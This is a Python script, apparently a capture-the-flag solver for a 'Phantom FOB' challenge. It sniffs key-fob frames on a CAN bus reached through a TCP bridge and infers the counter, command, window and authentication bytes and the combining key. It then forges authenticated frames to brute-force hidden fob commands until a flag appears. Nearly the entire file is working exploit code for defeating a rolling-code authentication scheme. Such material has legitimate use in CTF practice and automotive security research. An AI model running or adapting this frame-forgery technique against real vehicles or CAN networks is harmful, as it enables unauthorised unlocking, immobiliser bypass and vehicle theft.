#!/usr/bin/env python3
"""
phantom_auto.py - Phantom FOB CTF solver that discovers EVERYTHING per run
=========================================================================

Discovers per instance:
  * FOB CAN ID
  * counter byte position
  * command byte position and all 4 real command values
  * window byte position(s)
  * auth byte position
  * combining operator (xor / add / sub)
  * fixed bytes
  * per-window key K (derived from any captured frame)

Then sweeps all 256 - 4 command bytes in small bursts (4 per window),
re-capturing a fresh window between bursts.

Usage:
    python3 phantom_auto.py <TARGET_IP> [--verbose] [--iface can0|vcan0]
"""

import socket, re, time, sys, json, threading, subprocess
import urllib.request
from collections import Counter, defaultdict

# ------------------------------------------------------------- config -----
HTTP_PORT = 8080
CAN_PORT  = 29536
IFACE     = "can0"
BURST     = 4

BUTTONS = ["LOCK", "HORN", "IMMOB_ARM", "IMMOB_DISARM"]

FRAME_RE = re.compile(r"< frame ([0-9A-Fa-f]+) ([0-9.]+) ([0-9A-Fa-f]*) >")

verbose = False
def vprint(*a):
    if verbose: print(*a)


# ------------------------------------------------------------- HTTP -------
def press(host, btn):
    subprocess.run(
        ["curl","-s","-X","POST",f"http://{host}:{HTTP_PORT}/press",
         "-H","Content-Type: application/json",
         "-d", json.dumps({"button": btn})],
        capture_output=True)


def read_flag(host):
    """Non-blocking flag reader across all plausible endpoints."""
    for path in ("/state", "/status", "/api/state"):
        try:
            with urllib.request.urlopen(
                f"http://{host}:{HTTP_PORT}{path}", timeout=1) as r:
                raw = r.read().decode(errors="replace").strip()
            try:
                j = json.loads(raw)
                if isinstance(j, dict):
                    for k in ("flag","FLAG"):
                        if j.get(k): return j[k]
            except Exception: pass
            m = re.search(r"flag\{[^}]+\}", raw, re.I)
            if m: return m.group(0)
        except Exception: pass

    try:
        out = subprocess.run(
            ["curl","-s","--max-time","1",f"http://{host}:{HTTP_PORT}/events"],
            capture_output=True, timeout=3).stdout.decode(errors="replace")
        for line in out.splitlines():
            if line.startswith("data: "):
                try:
                    j = json.loads(line[6:].strip())
                    if isinstance(j, dict):
                        for k in ("flag","FLAG"):
                            if j.get(k): return j[k]
                except Exception: pass
            m = re.search(r"flag\{[^}]+\}", line, re.I)
            if m: return m.group(0)
    except Exception: pass
    return None


# -------------------------------------------------------------- CAN -------
class Can:
    def __init__(self, host, iface):
        self.sock = socket.create_connection((host, CAN_PORT), timeout=5)
        self.sock.settimeout(0.05)
        self.sock.sendall(f"< open {iface} >\n".encode()); time.sleep(0.4)
        self.sock.sendall(b"< rawmode >\n");               time.sleep(0.2)
        self.buf = b""
        self.log = []
        self._stop = False
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        while not self._stop:
            try: d = self.sock.recv(65536)
            except socket.timeout: continue
            except OSError: return
            if not d: return
            self.buf += d
            while b">" in self.buf:
                unit, self.buf = self.buf.split(b">", 1)
                m = FRAME_RE.search((unit + b">").decode("latin1"))
                if m:
                    self.log.append((time.time(),
                                     m.group(1).upper(),
                                     m.group(3).upper()))

    def since(self, t0, can_id=None):
        return [f for f in self.log
                if f[0] >= t0 and (can_id is None or f[1] == can_id)]

    def send(self, can_id_hex, payload_hex):
        b = [payload_hex[i:i+2].lower() for i in range(0,len(payload_hex),2)]
        self.sock.sendall(("< send %s %d %s >\n" %
                           (can_id_hex, len(b), " ".join(b))).encode())

    def stop(self):
        self._stop = True
        try: self.sock.close()
        except Exception: pass


# --------------------------------------------------- discovery routines --
def discover_fob_id(can, host):
    per_button = []
    for b in BUTTONS:
        t0 = time.time()
        press(host, b); time.sleep(0.7)
        per_button.append(set(f[1] for f in can.since(t0)))
        time.sleep(0.2)
    common = set.intersection(*per_button) if per_button else set()
    if not common:
        raise RuntimeError("no CAN ID appears after every button press")
    overall = Counter(f[1] for f in can.log)
    return min(common, key=lambda i: overall[i])


def capture_samples(can, host, fob_id, rounds=8):
    """Parallel-press 4 buttons; return list of (ts, bytes)."""
    out = []
    for _ in range(rounds):
        t0 = time.time()
        threads = [threading.Thread(target=press, args=(host, b)) for b in BUTTONS]
        for t in threads: t.start()
        for t in threads: t.join()
        time.sleep(0.6)
        for ts, cid, hx in can.since(t0, can_id=fob_id)[-len(BUTTONS):]:
            try:
                out.append((ts, bytes.fromhex(hx)))
            except ValueError:
                pass
        time.sleep(0.15)
    return out


def capture_one(can, host, fob_id, button="LOCK", timeout=2.0):
    t0 = time.time()
    press(host, button)
    while time.time() - t0 < timeout:
        fr = can.since(t0, can_id=fob_id)
        if fr:
            ts, cid, hx = fr[-1]
            try:    return bytes.fromhex(hx), hx
            except ValueError: return None, None
        time.sleep(0.02)
    return None, None


# ------------------------------------------------------ layout analysis --
def detect_layout(samples_ts):
    """
    samples_ts: list of (timestamp, bytes)
    Returns dict with counter, command, code, fixed, operator, key.
    """
    n = len(samples_ts[0][1])
    frames = [s[1] for s in samples_ts]
    cols = list(zip(*frames))

    fixed = [i for i in range(n) if len(set(cols[i])) == 1]

    # --- counter: byte with most +1 diffs across time-sorted frames
    ordered = sorted(samples_ts, key=lambda s: s[0])
    best_i, best_frac = None, -1.0
    for i in range(n):
        if i in fixed: continue
        vals = [s[1][i] for s in ordered]
        diffs = [(vals[j+1]-vals[j]) % 256 for j in range(len(vals)-1)]
        if not diffs: continue
        frac = sum(1 for d in diffs if d == 1) / len(diffs)
        if frac > best_frac:
            best_frac, best_i = frac, i
    counter_i = best_i

    # --- command: remaining byte with exactly 4 distinct values
    command_i = None
    cmd_card = []
    for i in range(n):
        if i in fixed or i == counter_i: continue
        c = len(set(cols[i]))
        cmd_card.append((i, c))
        if c == 4:
            command_i = i
    if command_i is None and cmd_card:
        command_i = min([c for c in cmd_card if c[1] > 1], key=lambda x: x[1])[0]

    # --- window byte(s): bytes with low cardinality and same-window constancy
    # group frames by proximity (< 0.7s gap)
    ordered2 = sorted(samples_ts, key=lambda s: s[0])
    groups = []
    cur = [ordered2[0]]
    for prev, nxt in zip(ordered2, ordered2[1:]):
        if nxt[0] - prev[0] < 0.7:
            cur.append(nxt)
        else:
            if len(cur) >= 2: groups.append([s[1] for s in cur])
            cur = [nxt]
    if len(cur) >= 2: groups.append([s[1] for s in cur])

    win_positions = []
    for i in range(n):
        if i in fixed or i == counter_i or i == command_i: continue
        # constant within every group
        if all(len(set(f[i] for f in g)) == 1 for g in groups):
            win_positions.append(i)
            if len(win_positions) >= 2: break

    # --- auth byte and operator: try every remaining position, every op
    auth_i = None
    op = None
    key = None

    remaining = [i for i in range(n)
                 if i not in fixed
                 and i != counter_i and i != command_i
                 and i not in win_positions]

    for cand in remaining:
        for op_try in ("xor", "add", "sub"):
            keys = set()
            ok = True
            for s in frames:
                ctr = s[counter_i]; cmd = s[command_i]
                wvals = [s[w] for w in win_positions]
                if op_try == "xor":
                    base = ctr ^ cmd
                    for w in wvals: base ^= w
                    k = s[cand] ^ base
                elif op_try == "add":
                    base = (ctr + cmd + sum(wvals)) & 0xFF
                    k = (s[cand] - base) & 0xFF
                else:
                    base = (ctr - cmd - sum(wvals)) & 0xFF
                    k = (s[cand] - base) & 0xFF
                keys.add(k)
            if len(keys) == 1:
                auth_i = cand; op = op_try; key = keys.pop(); break
        if auth_i is not None:
            break

    return {
        "counter": counter_i,
        "command": command_i,
        "window":  win_positions,
        "auth":    auth_i,
        "op":      op,
        "key":     key,
        "fixed":   {i: frames[-1][i] for i in fixed},
        "len":     n,
        "commands_seen": sorted(set(f[command_i] for f in frames)),
    }


# ------------------------------------------------------ forge helper -----
def auth_value(layout, ctr, cmd, frame):
    """Compute the auth byte for a forged frame."""
    w = layout["window"]
    op = layout["op"]; k = layout["key"]
    if op == "xor":
        base = ctr ^ cmd
        for wi in w: base ^= frame[wi]
        return (base ^ k) & 0xFF
    elif op == "add":
        base = (ctr + cmd + sum(frame[wi] for wi in w)) & 0xFF
        return (base + k) & 0xFF
    else:
        base = (ctr - cmd - sum(frame[wi] for wi in w)) & 0xFF
        return (base + k) & 0xFF


def forge_burst(can, fob_id_hex, template, layout, cmds):
    n = layout["len"]
    ctr_i = layout["counter"]
    cmd_i = layout["command"]
    auth_i = layout["auth"]
    next_ctr = template[ctr_i]

    for c in cmds:
        next_ctr = (next_ctr + 1) & 0xFF
        data = list(template)
        data[ctr_i] = next_ctr
        data[cmd_i] = c
        data[auth_i] = auth_value(layout, next_ctr, c, template)
        can.send(fob_id_hex, "".join(f"{b:02X}" for b in data))


# -------------------------------------------------------------- main ----
def main():
    global verbose, IFACE
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    verbose = "--verbose" in sys.argv
    if "--iface" in sys.argv:
        IFACE = sys.argv[sys.argv.index("--iface") + 1]
    if not args:
        print(__doc__); sys.exit(1)
    host = args[0]

    print(f"[*] target={host}  iface={IFACE}")
    print("[*] opening CAN...")
    try:
        can = Can(host, IFACE)
    except Exception as e:
        print(f"[-] CAN open failed: {e}; try --iface vcan0"); sys.exit(1)
    time.sleep(1.0)

    print("[*] discovering FOB CAN ID...")
    fob_id = discover_fob_id(can, host)
    print(f"[+] fob ID: 0x{fob_id}")

    print("[*] capturing samples (parallel bursts)...")
    samples = capture_samples(can, host, fob_id, rounds=10)
    print(f"[+] {len(samples)} samples")
    if len(samples) < 8:
        print("[-] too few samples"); can.stop(); sys.exit(1)

    print("[*] auto-detecting layout...")
    layout = detect_layout(samples)
    print(f"[+] layout: counter=b{layout['counter']} "
          f"command=b{layout['command']} window={['b'+str(x) for x in layout['window']]} "
          f"auth=b{layout['auth']} op={layout['op']} K=0x{layout['key']:02X}"
          if layout['auth'] is not None else "[!] layout detection failed")
    print(f"[+] fixed bytes: { {hex(k):hex(v) for k,v in layout['fixed'].items()} }")
    print(f"[+] known commands: {[hex(c) for c in layout['commands_seen']]}")

    if layout["auth"] is None:
        print("[-] could not find auth byte; inspect with --verbose")
        if verbose:
            for ts, fr in samples[:20]:
                print(f"    {fr.hex()}")
        can.stop(); sys.exit(1)

    known = set(layout["commands_seen"])
    unknown = [c for c in range(256) if c not in known]
    print(f"[*] sweeping {len(unknown)} unknown command bytes in bursts of {BURST}...")

    t_start = time.time()
    for attempt in range(1, 500):
        if not unknown:
            break
        template, hexstr = capture_one(can, host, fob_id, button="LOCK")
        if template is None:
            continue
        burst = unknown[:BURST]
        unknown = unknown[BURST:]
        forge_burst(can, fob_id, template, layout, burst)
        vprint(f"    [{attempt:03d}] {hexstr}  burst={[hex(c) for c in burst]}")
        if attempt % 3 == 0:
            flag = read_flag(host)
            if flag:
                print(f"\n[+] FLAG: {flag}\n")
                can.stop(); return
        time.sleep(0.05)

    time.sleep(0.5)
    flag = read_flag(host)
    if flag:
        print(f"\n[+] FLAG: {flag}\n")
    else:
        print(f"\n[-] {len(unknown)} commands left; "
              f"{time.time()-t_start:.1f}s elapsed; no flag")
        print("    Re-run, or --verbose to inspect.")
    can.stop()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted")
